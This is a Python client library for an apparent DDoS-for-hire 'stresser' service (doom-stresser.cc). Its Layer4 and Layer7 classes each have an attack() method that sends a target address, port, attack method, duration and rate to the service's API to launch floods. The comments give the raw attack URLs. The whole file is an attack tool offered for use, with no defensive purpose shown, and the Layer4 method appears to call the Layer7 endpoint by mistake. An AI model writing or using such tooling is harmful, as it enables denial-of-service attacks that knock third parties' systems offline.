from typing import List
from time import time
from requests import Session
from .enums import *


class DoomApiError(Exception):
    pass

class DoomApi:
    def __init__(self, user: int, token: str) -> None:
        self.token: str = token
        self.user: int = user

        self.session: Session = Session()
        self.layer4: Layer4 = Layer4(self)
        self.layer7: Layer7 = Layer7(self)


class Layer4:
    #https://doom-stresser.cc/start?user=423&api_key=&target=[target]&port=[port]&duration=[time]&method=[method]
    def __init__(self, client: DoomApi) -> None:
        self.client: DoomApi = client

    def attack(self, target: str, port: int, method: L4Method, duration: int):
        req = self.client.session.get(
            url="https://doom-stresser.cc/start7",
            params={
                "user": self.client.user,
                "api_key": self.client.token,
                "target": target,
                "duration": duration,
                "method": method,
                "port": port,
            }
        )

        return req.text

class Layer7:
    #https://doom-stresser.cc/start7?user=423&api_key=&address=[target]&duration=[time]&type7=[method]&port=[port]&rate=[1-64]
    def __init__(self, client: DoomApi) -> None:
        self.client: DoomApi = client

    def attack(self, target: str, port: int, method: L7Method, duration: int, rate: int = 1):
        req = self.client.session.get(
            url="https://doom-stresser.cc/start7",
            params={
                "user": self.client.user,
                "api_key": self.client.token,
                "address": target,
                "duration": duration,
                "type7": method,
                "port": port,
                "rate": rate
            }
        )

        if req.text != "Success":
            raise DoomApiError(req.text)

        return req.text
